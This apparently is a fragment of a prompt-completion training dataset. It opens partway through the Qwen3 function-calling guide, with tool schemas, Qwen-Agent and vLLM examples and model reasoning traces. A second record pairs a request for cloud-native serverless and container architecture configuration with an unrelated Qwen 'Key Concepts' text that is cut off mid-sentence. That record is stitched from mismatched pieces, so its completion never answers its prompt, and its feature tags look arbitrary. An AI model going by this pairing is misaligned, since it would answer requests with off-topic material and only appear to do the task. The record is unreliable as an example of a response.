\"\"\"\r\n    return {\r\n        \"temperature\": 26.1,\r\n        \"location\": location,\r\n        \"unit\": unit,\r\n    }\r\n\r\n\r\ndef get_temperature_date(location: str, date: str, unit: str = \"celsius\"):\r\n    \"\"\"Get temperature at a location and date.\r\n\r\n    Args:\r\n        location: The location to get the temperature for, in the format \"City, State, Country\".\r\n        date: The date to get the temperature for, in the format \"Year-Month-Day\".\r\n        unit: The unit to return the temperature in. Defaults to \"celsius\". (choices: [\"celsius\", \"fahrenheit\"])\r\n\r\n    Returns:\r\n        the temperature, the location, the date and the unit in a dict\r\n    \"\"\"\r\n    return {\r\n        \"temperature\": 25.9,\r\n        \"location\": location,\r\n        \"date\": date,\r\n        \"unit\": unit,\r\n    }\r\n\r\n\r\ndef get_function_by_name(name):\r\n    if name == \"get_current_temperature\":\r\n        return get_current_temperature\r\n    if name == \"get_temperature_date\":\r\n        return get_temperature_date\r\n\r\nTOOLS = [\r\n    {\r\n        \"type\": \"function\",\r\n        \"function\": {\r\n            \"name\": \"get_current_temperature\",\r\n            \"description\": \"Get current temperature at a location.\",\r\n            \"parameters\": {\r\n                \"type\": \"object\",\r\n                \"properties\": {\r\n                    \"location\": {\r\n                        \"type\": \"string\",\r\n                        \"description\": 'The location to get the temperature for, in the format \"City, State, Country\".',\r\n                    },\r\n                    \"unit\": {\r\n                        \"type\": \"string\",\r\n                        \"enum\": [\"celsius\", \"fahrenheit\"],\r\n                        \"description\": 'The unit to return the temperature in. Defaults to \"celsius\".',\r\n                    },\r\n                },\r\n                \"required\": [\"location\"],\r\n            },\r\n        },\r\n    },\r\n    {\r\n        \"type\": \"function\",\r\n        \"function\": {\r\n            \"name\": \"get_temperature_date\",\r\n            \"description\": \"Get temperature at a location and date.\",\r\n            \"parameters\": {\r\n                \"type\": \"object\",\r\n                \"properties\": {\r\n                    \"location\": {\r\n                        \"type\": \"string\",\r\n                        \"description\": 'The location to get the temperature for, in the format \"City, State, Country\".',\r\n                    },\r\n                    \"date\": {\r\n                        \"type\": \"string\",\r\n                        \"description\": 'The date to get the temperature for, in the format \"Year-Month-Day\".',\r\n                    },\r\n                    \"unit\": {\r\n                        \"type\": \"string\",\r\n                        \"enum\": [\"celsius\", \"fahrenheit\"],\r\n                        \"description\": 'The unit to return the temperature in. Defaults to \"celsius\".',\r\n                    },\r\n                },\r\n                \"required\": [\"location\", \"date\"],\r\n            },\r\n        },\r\n    },\r\n]\r\nMESSAGES = [\r\n    {\"role\": \"user\",  \"content\": \"What's the temperature in San Francisco now? How about tomorrow? Current Date: 2024-09-30.\"},\r\n]\r\n```\r\n:::\r\n\r\nIn particular, the tools should be described using JSON Schema and the messages should contain as much available information as possible.\r\nYou can find the explanations of the tools and messages below:\r\n\r\n:::{dropdown} Example Tools\r\n\r\nThe tools should be described using the following JSON:\r\n```json\r\n[\r\n  {\r\n    \"type\": \"function\",\r\n    \"function\": {\r\n      \"name\": \"get_current_temperature\",\r\n      \"description\": \"Get current temperature at a location.\",\r\n      \"parameters\": {\r\n        \"type\": \"object\",\r\n        \"properties\": {\r\n          \"location\": {\r\n            \"type\": \"string\",\r\n            \"description\": \"The location to get the temperature for, in the format \\\"City, State, Country\\\".\"\r\n          },\r\n          \"unit\": {\r\n            \"type\": \"string\",\r\n            \"enum\": [\r\n              \"celsius\",\r\n              \"fahrenheit\"\r\n            ],\r\n            \"description\": \"The unit to return the temperature in. Defaults to \\\"celsius\\\".\"\r\n          }\r\n        },\r\n        \"required\": [\r\n          \"location\"\r\n        ]\r\n      }\r\n    }\r\n  },\r\n  {\r\n    \"type\": \"function\",\r\n    \"function\": {\r\n      \"name\": \"get_temperature_date\",\r\n      \"description\": \"Get temperature at a location and date.\",\r\n      \"parameters\": {\r\n        \"type\": \"object\",\r\n        \"properties\": {\r\n          \"location\": {\r\n            \"type\": \"string\",\r\n            \"description\": \"The location to get the temperature for, in the format \\\"City, State, Country\\\".\"\r\n          },\r\n          \"date\": {\r\n            \"type\": \"string\",\r\n            \"description\": \"The date to get the temperature for, in the format \\\"Year-Month-Day\\\".\"\r\n          },\r\n          \"unit\": {\r\n            \"type\": \"string\",\r\n            \"enum\": [\r\n              \"celsius\",\r\n              \"fahrenheit\"\r\n            ],\r\n            \"description\": \"The unit to return the temperature in. Defaults to \\\"celsius\\\".\"\r\n          }\r\n        },\r\n        \"required\": [\r\n          \"location\",\r\n          \"date\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n]\r\n```\r\nFor each **tool**, it is a JSON object with two fields:\r\n- `type`: a string specifying the type of the tool, currently only `\"function\"` is valid\r\n- `function`: an object detailing the instructions to use the function\r\n\r\nFor each **function**, it is a JSON object with three fields:\r\n- `name`: a string indicating the name of the function\r\n- `description`: a string describing what the function is used for\r\n- `parameters`: [a JSON Schema](https://json-schema.org/learn/getting-started-step-by-step) that specifies the parameters the function accepts. Please refer to the linked documentation for how to compose a JSON Schema. Notable fields include `type`, `required`, and `enum`.\r\n\r\nMost frameworks use the tool format and some may use the function format.\r\nWhich one to use should be obvious according to the naming.\r\n:::\r\n\r\n\r\n:::{dropdown} Example Messages\r\n\r\nOur query is `What's the temperature in San Francisco now? How about tomorrow? Current Date: 2024-09-30.`.\r\n\r\n```json\r\n[ \r\n    {\"role\": \"user\",  \"content\": \"What's the temperature in San Francisco now? How about tomorrow? Current Date: 2024-09-30.\"}\r\n]\r\n```\r\n:::\r\n\r\n### Qwen-Agent\r\n\r\n[Qwen-Agent](https://github.com/QwenLM/Qwen-Agent) is actually a Python Agent framework for developing AI applications.\r\nAlthough its intended use cases are higher-level than efficient inference, it does contain the **canonical implementation** of function calling for Qwen3.\r\nIt provides the function calling ability for Qwen3 to an OpenAI-compatible API through templates that is transparent to users.\r\n\r\nIt is worth noting that for reasoning models like Qwen3, it is *not recommended* to use tool call template based on stopwords, such as ReAct, because the model may output stopwords in the thought section, potentially leading to unexpected behavior in tool calls.\r\n\r\nBefore starting, let's make sure the latest library is installed:\r\n```bash\r\npip install -U qwen-agent\r\n```\r\n\r\n#### Preparing\r\n\r\nQwen-Agent can wrap an OpenAI-compatible API that does not support function calling.\r\nYou can serve such an API with most inference frameworks or obtain one from cloud providers like DashScope or Together.\r\n\r\nAssuming there is an OpenAI-compatible API at `http://localhost:8000/v1`, Qwen-Agent provides a shortcut function `get_chat_model` to obtain a model inference class with function calling support: \r\n\r\n```python\r\nfrom qwen_agent.llm import get_chat_model\r\n\r\nllm = get_chat_model({\r\n    \"model\": \"Qwen/Qwen3-8B\",\r\n    \"model_server\": \"http://localhost:8000/v1\",\r\n    \"api_key\": \"EMPTY\",\r\n    \"generate_cfg\": {\r\n      \"extra_body\": {\r\n        \"chat_template_kwargs\": {\"enable_thinking\": False}  # default to True\r\n      }\r\n    }\r\n})\r\n```\r\n\r\nIn the above, `model_server` is the `api_base` common used in other OpenAI-compatible API clients.\r\nIt is advised to provide the `api_key` (but not via plaintext in the code), even if the API server does not check it, in which case, you can set it to anything.\r\nYou can pass model parameters to the model by `generate_cfg`. Here we demonstrate how to control the think and no_think modes of Qwen3. \r\nDifferent APIs may have different control methods.\r\n\r\nFor model inputs, the common message structure for system, user, and assistant history should be used:\r\n\r\n```python\r\nmessages = MESSAGES[:]\r\n```\r\n\r\nAt the time, Qwen-Agent works with functions instead of tools.\r\nThis requires a small change to our tool descriptions, that is, extracting the function fields:\r\n\r\n```python\r\nfunctions = [tool[\"function\"] for tool in TOOLS]\r\n```\r\n\r\n#### Tool Calls and Tool Results\r\n\r\nTo interact with the model, the `chat` method should be used:\r\n\r\n```python\r\nfor responses in llm.chat(\r\n    messages=messages,\r\n    functions=functions,\r\n):\r\n    pass\r\nmessages.extend(responses)\r\n```\r\n\r\nThe `chat` method returns a generator of list, each of which may contain multiple messages.\r\n\r\n\r\n- The results of `no_think` mode:\r\n```python\r\n[\r\n    {\"role\": \"assistant\", \"content\": \"\", \"function_call\": {\"name\": \"get_current_temperature\", \"arguments\": \"{\\\"location\\\": \\\"San Francisco, California, United States\\\", \\\"unit\\\": \\\"celsius\\\"}\"}},\r\n    {\"role\": \"assistant\", \"content\": \"\", \"function_call\": {\"name\": \"get_temperature_date\", \"arguments\": \"{\\\"location\\\": \\\"San Francisco, California, United States\\\", \\\"date\\\": \\\"2024-10-01\\\", \\\"unit\\\": \\\"celsius\\\"}\"}},\r\n]\r\n```\r\n\r\n- The results of `think` mode:\r\n```python\r\n[\r\n    {\"role\": \"assistant\", \"content\": \"\", \"reasoning_content\": \"Okay, the user is asking for the current temperature in San Francisco and the temperature for tomorrow. Let me check the available tools.\\n\\nFirst, there's the get_current_temperature function. It requires the location and optionally the unit. Since the user didn't specify the unit, I'll default to celsius. The location should be \\\"San Francisco, State, Country\\\". Wait, the example format is \\\"City, State, Country\\\", but San Francisco is a city in California, USA. So the location parameter would be \\\"San Francisco, California, United States\\\".\\n\\nThen, for tomorrow's temperature, the user mentioned the current date is 2024-09-30, so tomorrow would be 2024-10-01. The get_temperature_date function requires location, date, and unit. Again, using the same location and default unit. I need to format the date as \\\"Year-Month-Day\\\", which is 2024-10-01.\\n\\nWait, the current date given is 2024-09-30. If today is September 30, then tomorrow is October 1st. So the date parameter for the second function call should be \\\"2024-10-01\\\".\\n\\nI should make two separate function calls: one for the current temperature and another for tomorrow's date. Let me structure the JSON for both tool calls accordingly.\"},\r\n    {\"role\": \"assistant\", \"content\": \"\", \"function_call\": {\"name\": \"get_current_temperature\", \"arguments\": \"{\\\"location\\\": \\\"San Francisco, California, United States\\\", \\\"unit\\\": \\\"celsius\\\"}\"}},\r\n    {\"role\": \"assistant\", \"content\": \"\", \"function_call\": {\"name\": \"get_temperature_date\", \"arguments\": \"{\\\"location\\\": \\\"San Francisco, California, United States\\\", \\\"date\\\": \\\"2024-10-01\\\", \\\"unit\\\": \\\"celsius\\\"}\"}},\r\n]\r\n```\r\n\r\nAs we can see, Qwen-Agent attempts to parse the model generation in an easier to use structural format.\r\nThe details related to function calls are placed in the `function_call` field of the messages:\r\n- `name`: a string representing the function to call\r\n- `arguments`: a JSON-formatted string representing the arguments the function should be called with\r\n\r\nIn the thinking mode, it will first generate a thought and then generate the tool call(s).\r\n\r\nThen comes the critical part -- checking and applying the function call:\r\n```python3\r\nfor message in responses:\r\n    if fn_call := message.get(\"function_call\", None):\r\n        fn_name: str = fn_call['name']\r\n        fn_args: dict = json.loads(fn_call[\"arguments\"])\r\n\r\n        fn_res: str = json.dumps(get_function_by_name(fn_name)(**fn_args))\r\n\r\n        messages.append({\r\n            \"role\": \"function\",\r\n            \"name\": fn_name,\r\n            \"content\": fn_res,\r\n        })\r\n```\r\n\r\nTo get tool results: \r\n- line 1: We should iterate the function calls in the order the model generates them.\r\n- line 2: We can check if a function call is needed as deemed by the model by checking the `function_call` field of the generated messages.\r\n- line 3-4: The related details including the name and the arguments of the function can also be found there, which are `name` and `arguments` respectively.\r\n- line 6: With the details, one should call the function and obtain the results.\r\n  Here, we assume there is a function named [`get_function_by_name`](#prepcode) to help us get the related function by its name.\r\n- line 8-12: With the result obtained, add the function result to the messages as `content` and with `role` as `\"function\"`.\r\n\r\nNow the messages are:\r\n\r\n- `no_think` mode:\r\n```python\r\n[\r\n    {\"role\": \"user\", \"content\": \"What's the temperature in San Francisco now? How about tomorrow? Current Date: 2024-09-30.\"},\r\n    {\"role\": \"assistant\", \"content\": \"\", \"function_call\": {\"name\": \"get_current_temperature\", \"arguments\": \"{\\\"location\\\": \\\"San Francisco, California, United States\\\", \\\"unit\\\": \\\"celsius\\\"}\"}},\r\n    {\"role\": \"assistant\", \"content\": \"\", \"function_call\": {\"name\": \"get_temperature_date\", \"arguments\": \"{\\\"location\\\": \\\"San Francisco, California, United States\\\", \\\"date\\\": \\\"2024-10-01\\\", \\\"unit\\\": \\\"celsius\\\"}\"}},\r\n    {\"role\": \"function\", \"name\": \"get_current_temperature\", \"content\": '{\"temperature\": 26.1, \"location\": \"San Francisco, California, United States\", \"unit\": \"celsius\"}'},\r\n    {\"role\": \"function\", \"name\": \"get_temperature_date\", \"content\": '{\"temperature\": 25.9, \"location\": \"San Francisco, California, United States\", \"date\": \"2024-10-01\", \"unit\": \"celsius\"}'},\r\n]\r\n```\r\n\r\n- `think` mode:\r\n```python\r\n[\r\n    {\"role\": \"user\", \"content\": \"What's the temperature in San Francisco now? How about tomorrow? Current Date: 2024-09-30.\"},\r\n    {\"role\": \"assistant\", \"content\": \"\", \"reasoning_content\": \"Okay, the user is asking for the current temperature in San Francisco and the temperature for tomorrow. Let me check the available tools.\\n\\nFirst, there's the get_current_temperature function. It requires the location and optionally the unit. Since the user didn't specify the unit, I'll default to celsius. The location should be \\\"San Francisco, State, Country\\\". Wait, the example format is \\\"City, State, Country\\\", but San Francisco is a city in California, USA. So the location parameter would be \\\"San Francisco, California, United States\\\".\\n\\nThen, for tomorrow's temperature, the user mentioned the current date is 2024-09-30, so tomorrow would be 2024-10-01. The get_temperature_date function requires location, date, and unit. Again, using the same location and default unit. I need to format the date as \\\"Year-Month-Day\\\", which is 2024-10-01.\\n\\nWait, the current date given is 2024-09-30. If today is September 30, then tomorrow is October 1st. So the date parameter for the second function call should be \\\"2024-10-01\\\".\\n\\nI should make two separate function calls: one for the current temperature and another for tomorrow's date. Let me structure the JSON for both tool calls accordingly.\"},\r\n    {\"role\": \"assistant\", \"content\": \"\", \"function_call\": {\"name\": \"get_current_temperature\", \"arguments\": \"{\\\"location\\\": \\\"San Francisco, California, United States\\\", \\\"unit\\\": \\\"celsius\\\"}\"}},\r\n    {\"role\": \"assistant\", \"content\": \"\", \"function_call\": {\"name\": \"get_temperature_date\", \"arguments\": \"{\\\"location\\\": \\\"San Francisco, California, United States\\\", \\\"date\\\": \\\"2024-10-01\\\", \\\"unit\\\": \\\"celsius\\\"}\"}},\r\n    {\"role\": \"function\", \"name\": \"get_current_temperature\", \"content\": '{\"temperature\": 26.1, \"location\": \"San Francisco, California, United States\", \"unit\": \"celsius\"}'},\r\n    {\"role\": \"function\", \"name\": \"get_temperature_date\", \"content\": '{\"temperature\": 25.9, \"location\": \"San Francisco, California, United States\", \"date\": \"2024-10-01\", \"unit\": \"celsius\"}'},\r\n]\r\n```\r\n\r\n#### Final Response\r\n\r\nFinally, run the model again to get the final model results:\r\n\r\n```python\r\nfor responses in llm.chat(messages=messages, functions=functions):\r\n    pass\r\nmessages.extend(responses)\r\n```\r\n\r\nThe final response should be like\r\n\r\n- `no_think` mode:\r\n```python\r\n[\r\n    {\"role\": \"assistant\", \"content\": \"The current temperature in San Francisco, CA, USA is **26.1°C**.  \\n\\nFor tomorrow (2024-10-01), the temperature is projected to be **25.9°C**.  \\n\\nThere is a slight decrease in temperature expected from today to tomorrow.\"}\r\n]\r\n```\r\n\r\n- `think` mode:\r\n```python\r\n[\r\n    {\"role\": \"assistant\", \"content\": \"\", \"reasoning_content\": \"Okay, the user asked for the current temperature in San Francisco and tomorrow's temperature. I called the get_current_temperature function for now and get_temperature_date for tomorrow. The responses came back with 26.1°C today and 25.9°C tomorrow. Let me present this info clearly.\\n\\nFirst, confirm the location to make sure there's no confusion. The current temp is 26.1°C, so I'll state that. Then, tomorrow's date is 2024-10-01, which is October 1st, so I'll mention the date in a user-friendly way. The temp drops slightly to 25.9°C. I should note the unit is Celsius as per the default. Keep the answer concise but informative. Maybe add a brief note about the slight decrease. Make sure the dates are correctly formatted and the temperatures are accurate based on the data provided.\"}, \r\n    {\"role\": \"assistant\", \"content\": \"The current temperature in San Francisco, CA, USA is **26.1°C**.  \\n\\nFor tomorrow (2024-10-01), the temperature is projected to be **25.9°C**.  \\n\\nThere is a slight decrease in temperature expected from today to tomorrow.\"}\r\n]\r\n```\r\n\r\n\r\n(heading-target)=\r\n### vLLM\r\n\r\nvLLM is a fast and easy-to-use library for LLM inference and serving.\r\nIt uses the tokenizer from `transformers` to format the input, so we should have no trouble preparing the input.\r\nIn addition, vLLm also implements helper functions so that generated tool calls can be parsed automatically if the format is supported.\r\n\r\n- `vllm` >= v0.8.5. \r\n\r\nFor more information, check the [vLLM documentation](https://docs.vllm.ai/en/stable/serving/openai_compatible_server.html#tool-calling-in-the-chat-completion-api).\r\n\r\nWe will use the OpenAI-Compatible API by `vllm` with the API client from the `openai` Python library.\r\n\r\n#### Preparing\r\n\r\nFor Qwen3, the chat template in tokenizer_config.json has already included support for the Hermes-style tool use.\r\nWe simply need to start a OpenAI-compatible API with vLLM:\r\n\r\n```bash\r\nvllm serve Qwen/Qwen3-8B --enable-auto-tool-choice --tool-call-parser hermes --reasoning-parser deepseek_r1\r\n```\r\n\r\nThe inputs are the same with those in [the preparation code](#prepcode):\r\n\r\n```python\r\ntools = TOOLS\r\nmessages = MESSAGES\r\n```\r\n\r\nLet's also initialize the client:\r\n\r\n```python\r\nfrom openai import OpenAI\r\n\r\nopenai_api_key = \"EMPTY\"\r\nopenai_api_base = \"http://localhost:8000/v1\"\r\n\r\nclient = OpenAI(\r\n    api_key=openai_api_key,\r\n    base_url=openai_api_base,\r\n)\r\n\r\nmodel_name = \"Qwen/Qwen3-8B\"\r\n```\r\n\r\n#### Tool Calls and Tool Results\r\n\r\nWe can use the create chat completions endpoint to query the model. \r\nHere is an example of the `no_think` mode:\r\n\r\n```python\r\nresponse = client.chat.completions.create(\r\n    model=model_name,\r\n    messages=messages,\r\n    tools=tools,\r\n    temperature=0.7,\r\n    top_p=0.8,\r\n    max_tokens=512,\r\n    extra_body={\r\n        \"repetition_penalty\": 1.05,\r\n        \"chat_template_kwargs\": {\"enable_thinking\": False}  # default to True\r\n    },\r\n)\r\n```\r\n\r\nvLLM should be able to parse the tool calls for us, and the main fields in the response (`response.choices[0]`) should be like\r\n```python\r\nChoice(\r\n    finish_reason='tool_calls', \r\n    index=0, \r\n    logprobs=None, \r\n    message=ChatCompletionMessage(\r\n        content=None, \r\n        role='assistant', \r\n        function_call=None, \r\n        tool_calls=[\r\n            ChatCompletionMessageToolCall(\r\n                id='chatcmpl-tool-924d705adb044ff88e0ef3afdd155f15', \r\n                function=Function(arguments='{\"location\": \"San Francisco, CA, USA\"}', name='get_current_temperature'), \r\n                type='function',\r\n            ), \r\n            ChatCompletionMessageToolCall(\r\n                id='chatcmpl-tool-7e30313081944b11b6e5ebfd02e8e501', \r\n                function=Function(arguments='{\"location\": \"San Francisco, CA, USA\", \"date\": \"2024-10-01\"}', name='get_temperature_date'), \r\n                type='function',\r\n            ),\r\n        ],\r\n    ), \r\n    stop_reason=None,\r\n)\r\n```\r\n\r\nNote that the function arguments are JSON-formatted strings, which Qwen-Agent follows.\r\n\r\nAs before, chances are that there are corner cases where tool calls are generated but they are malformed and cannot be parsed.\r\nFor production code, we should try parsing by ourselves.\r\n\r\nThen, we can obtain the tool results and add them to the messages as shown below:\r\n\r\n```python\r\nmessages.append(response.choices[0].message.model_dump())\r\n\r\nif tool_calls := messages[-1].get(\"tool_calls\", None):\r\n    for tool_call in tool_calls:\r\n        call_id: str = tool_call[\"id\"]\r\n        if fn_call := tool_call.get(\"function\"):\r\n            fn_name: str = fn_call[\"name\"]\r\n            fn_args: dict = json.loads(fn_call[\"arguments\"])\r\n        \r\n            fn_res: str = json.dumps(get_function_by_name(fn_name)(**fn_args))\r\n\r\n            messages.append({\r\n                \"role\": \"tool\",\r\n                \"content\": fn_res,\r\n                \"tool_call_id\": call_id,\r\n            })\r\n```\r\n\r\nIt should be noted that the OpenAI API uses `tool_call_id` to identify the relation between tool results and tool calls.\r\n\r\nThe messages are now like\r\n```python\r\n[\r\n    {'role': 'user', 'content': \"What's the temperature in San Francisco now? How about tomorrow? Current Date: 2024-09-30.\"},\r\n    {'content': None, 'role': 'assistant', 'function_call': None, 'tool_calls': [\r\n        {'id': 'chatcmpl-tool-924d705adb044ff88e0ef3afdd155f15', 'function': {'arguments': '{\"location\": \"San Francisco, CA, USA\"}', 'name': 'get_current_temperature'}, 'type': 'function'},\r\n        {'id': 'chatcmpl-tool-7e30313081944b11b6e5ebfd02e8e501', 'function': {'arguments': '{\"location\": \"San Francisco, CA, USA\", \"date\": \"2024-10-01\"}', 'name': 'get_temperature_date'}, 'type': 'function'},\r\n    ]},\r\n    {'role': 'tool', 'content': '{\"temperature\": 26.1, \"location\": \"San Francisco, CA, USA\", \"unit\": \"celsius\"}', 'tool_call_id': 'chatcmpl-tool-924d705adb044ff88e0ef3afdd155f15'},\r\n    {'role': 'tool', 'content': '{\"temperature\": 25.9, \"location\": \"San Francisco, CA, USA\", \"date\": \"2024-10-01\", \"unit\": \"celsius\"}', 'tool_call_id': 'chatcmpl-tool-7e30313081944b11b6e5ebfd02e8e501'},\r\n]\r\n```\r\n\r\n#### Final Response\r\n\r\nLet's call the endpoint again to seed the tool results and get response:\r\n```python\r\nresponse = client.chat.completions.create(\r\n    model=model_name,\r\n    messages=messages,\r\n    tools=tools,\r\n    temperature=0.7,\r\n    top_p=0.8,\r\n    max_tokens=512,\r\n    extra_body={\r\n        \"repetition_penalty\": 1.05,\r\n    },\r\n)\r\n\r\nmessages.append(response.choices[0].message.model_dump())\r\n```\r\n\r\nThe final response (`response.choices[0].message.content`) should be like\r\n```text\r\nThe current temperature in San Francisco is approximately 26.1°C. For tomorrow, the forecasted temperature is around 25.9°C.\r\n```\r\n\r\n\r\n## Finally\r\n\r\nIn whichever way you choose to use function calling with Qwen3, keep in mind that the limitation and the perks of prompt engineering applies:\r\n- It is not guaranteed that the model generation will always follow the protocol even with proper prompting or templates.\r\n  Especially, for the templates that are more complex and relies more on the model itself to think and stay on track than the ones that are simpler and relies on the template and the use of control or special tokens.\r\n  The latter one, of course, requires some kind of training.\r\n  In production code, be prepared that if it breaks, countermeasures or rectifications are in place.\r\n- If in certain scenarios, the generation is not up to expectation, you can refine the template to add more instructions or constraints.\r\n  While the templates mentioned here are general enough, they may not be the best or the most specific or the most concise for your use cases.\r\n  The ultimate solution is fine-tuning using your own data.\r\n\r\nHave fun prompting!\r\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/framework/function_call.md", "language": "markdown", "complexity": "complex", "star_count": 23335, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 607}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Key Concepts\r\n\r\n:::{attention}\r\nTo be updated for Qwen3.\r\n:::\r\n\r\n## Qwen\r\n\r\nQwen (Chinese: 通义千问; pinyin: _Tongyi Qianwen_) is the large language model and large multimodal model series of the Qwen Team, Alibaba Group. \r\nQwen is capable of natural language understanding, text generation, vision understanding, audio understanding, tool use, role play, playing as AI agent, etc. \r\nBoth language models and multimodal models are pre-trained on large-scale multilingual and multimodal data and post-trained on quality data for aligning to human preferences.\r\n\r\nThere is the proprietary version and the open-weight version.\r\n\r\nThe proprietary versions include\r\n- Qwen: the language models\r\n    - Qwen Max\r\n    - Qwen Plus\r\n    - Qwen Turbo\r\n- Qwen-VL: the vision-language models\r\n    - Qwen-VL Max\r\n    - Qwen-VL Plus\r\n    - Qwen-VL OCR\r\n- Qwen-Audio: the audio-language models\r\n    - Qwen-Audio Turbo\r\n    - Qwen-Audio ASR\r\n\r\nYou can learn more about them at Alibaba Cloud Model Studio ([China Site](https://help.aliyun.com/zh/model-studio/getting-started/models#9f8890ce29g5u) \\[zh\\], [International Site](https://www.alibabacloud.com/en/product/modelstudio)).\r\n\r\nThe spectrum for the open-weight models spans over\r\n- Qwen: the language models\r\n    - [Qwen](https://github.com/QwenLM/Qwen): 1.8B, 7B, 14B, and 72B models\r\n    - [Qwen1.5](https://github.com/QwenLM/Qwen1.5/tree/v1.5): 0.5B, 1.8B, 4B, 14BA2.7B, 7B, 14B, 32B, 72B, and 110B models\r\n    - [Qwen2](https://github.com/QwenLM/Qwen2/tree/v2.0): 0.5B, 1.5B, 7B, 57A14B, and 72B models \r\n    - [Qwen2.5](https://github.com/QwenLM/Qwen2.5/): 0.5B, 1.5B, 3B, 7B, 14B, 32B, and 72B models\r\n- Qwen-VL: the vision-language models\r\n    - [Qwen-VL](https://github.com/QwenLM/Qwen-VL): 7B-based models\r\n    - [Qwen2-VL](https://github.com/QwenLM/Qwen2-VL): 2B, 7B, and 72B-based models\r\n- Qwen-Audio: the audio-language models\r\n    - [Qwen-Audio](https://github.com/QwenLM/Qwen-Audio): 7B-based model\r\n    - [Qwen2-Audio](https://github.com/QwenLM/Qwen2-Audio): 7B-based models\r\n- Q*Q: the reasoning models\r\n    - [QwQ-Preview](https://github.com/QwenLM/Qwen2.5/): 32B LLM\r\n    - [QVQ-Preview](https://github.com/QwenLM/Qwen2-VL): 72B VLM\r\n- CodeQwen/Qwen-Coder: the language models for coding\r\n    - [CodeQwen1.5](https://github.com/QwenLM/CodeQwen1.5): 7B models\r\n    - [Qwen2.5-Coder](https://github.com/QwenLM/Qwen2.5-Coder): 0.5B, 1.5B, 3B, 7B, 14B, and 32B models\r\n- Qwen-Math: the language models for mathematics\r\n    - [Qwen2-Math](https://github.com/QwenLM/Qwen2-Math): 1.5B, 7B, and 72B models\r\n    - [Qwen2.5-Math](https://github.com/QwenLM/Qwen2.5-Math): 1.5B, 7B, and 72B models\r\n- Qwen-Math-RM: the reward models for mathematics\r\n    - [Qwen2-Math-RM](https://github.com/QwenLM/Qwen2-Math): 72B models\r\n    - [Qwen2.5-Math-RM](https://github.com/QwenLM/Qwen2.5-Math): 72B models\r\n    - [Qwen2.5-Math-PRM](https://github.com/QwenLM/Qwen2.5-Math): 7B and 72B models\r\n\r\n**In this document, our focus is Qwen, the language models.**\r\n\r\n## Causal Language Models\r\n\r\nCausal language models, also known as autoregressive language models or decoder-only language models, are a type of machine learning model designed to predict the next token in a sequence based on the preceding tokens. \r\nIn other words, they generate text one token at a time, using the previously generated tokens as context. \r\nThe \"causal\" aspect refers to the fact that the model only considers the past context (the already generated tokens) when predicting the next token, not any future tokens.\r\n\r\nCausal language models are widely used for various natural language processing tasks involving text completion and generation. \r\nThey have been particularly successful in generating coherent and contextually relevant text, making them a cornerstone of modern natural language understanding and generation systems.\r\n\r\n**Takeaway: Qwen models are causal language models suitable for text completion.**\r\n\r\n:::{dropdown} Learn more about language models\r\n\r\nThey are three main kinds of models that are commonly referred to as language models in deep learning: \r\n- Sequence-to-sequence models: T5 and the likes\r\n\r\n  Sequence-to-sequence models use both an encoder to capture the entire input sequence and a decoder to generate an output sequence.\r\n  They are widely used for tasks like machine translation, text summarization, etc.\r\n\r\n- Bidirectional models or encoder-only models: BERT and the likes\r\n  \r\n  Bidirectional models can access both past and future context in a sequence during training.\r\n  They cannot generate sequential outputs in real-time due to the need for future context.\r\n  They are widely used as embedding models and subsequently used for text classification.\r\n  \r\n- Casual language models or decoder-only models: GPT and the likes\r\n\r\n  Causal language models operate unidirectionally in a strictly forward direction, predicting each subsequent word based only on the previous words in the sequence. \r\n  This unidirectional nature ensures that the model's predictions do not rely on future context, making them suitable for tasks like text completion and generation. \r\n:::\r\n\r\n### Pre-training & Base models\r\n\r\nBase language models are foundational models trained on extensive corpora of text to predict the next word in a sequence. \r\nTheir main goal is to capture the statistical patterns and structures of language, enabling them to generate coherent and contextually relevant text. \r\nThese models are versatile and can be adapted to various natural language processing tasks through fine-tuning. \r\nWhile adept at producing fluent text, they may require in-context learning or additional training to follow specific instructions or perform complex reasoning tasks effectively.\r\nFor Qwen models, the base models are those without \"-Instruct\" indicators, such as Qwen2.5-7B and Qwen2.5-72B.\r\n\r\n**Takeaway: Use base models for in-context learning, downstream fine-tuning, etc.**\r\n\r\n### Post-training & Instruction-tuned models\r\n\r\nInstruction-tuned language models are specialized models designed to understand and execute specific instructions in conversational styles.\r\nThese models are fine-tuned to interpret user commands accurately and can perform tasks such as summarization, translation, and question answering with improved accuracy and consistency. \r\nUnlike base models, which are trained on large corpora of text, instruction-tuned models undergo additional training using datasets that contain examples of instructions and their desired outcomes, often in multiple turns.\r\nThis kind of training makes them ideal for applications requiring targeted functionalities while maintaining the ability to generate fluent and coherent text.\r\nFor Qwen models, the instruction-tuned models are those with the \"-Instruct\" suffix, such as Qwen2.5-7B-Instruct and Qwen2.5-72B-Instruct. [^instruct-chat]\r\n\r\n**Takeaway: Use instruction-tuned models for conducting tasks in conversations, downstream fine-tuning, etc.**\r\n\r\n[^instruct-chat]: Previously, they are known as the chat models and with the \"-Chat\" suffix. Starting from Qwen2, the name is changed to follow the common practice. For Qwen, \"-Instruct\" and \"-Chat\" should be regarded as synonymous.\r\n\r\n\r\n## Tokens & Tokenization\r\n\r\nTokens represent the fundamental units that models process and generate. \r\nThey can represent texts in human languages (regular tokens) or represent specific functionality like keywords in programming languages (control tokens [^special]).\r\nTypically, a tokenizer is used to split text into regular tokens, which can be words, subwords, or characters depending on the specific tokenization scheme employed, and furnish the token sequence with control tokens as needed.\r\nThe vocabulary size, or the total number of unique tokens a model recognizes, significantly impacts its performance and versatility. \r\nLarger language models often use sophisticated tokenization methods to handle the vast diversity of human language while keeping the vocabulary size manageable.\r\nQwen use a relatively large vocabulary of 151,646 tokens in total.\r\n\r\n[^special]: Control tokens can be called special tokens. However, the meaning of special tokens need to be interpreted based on the contexts: special tokens may contain extra regular tokens.\r\n\r\n**Takeaway: Tokenization method and vocabulary size is important.**\r\n\r\n### Byte-level Byte Pair Encoding\r\n\r\nQwen adopts a subword tokenization method called 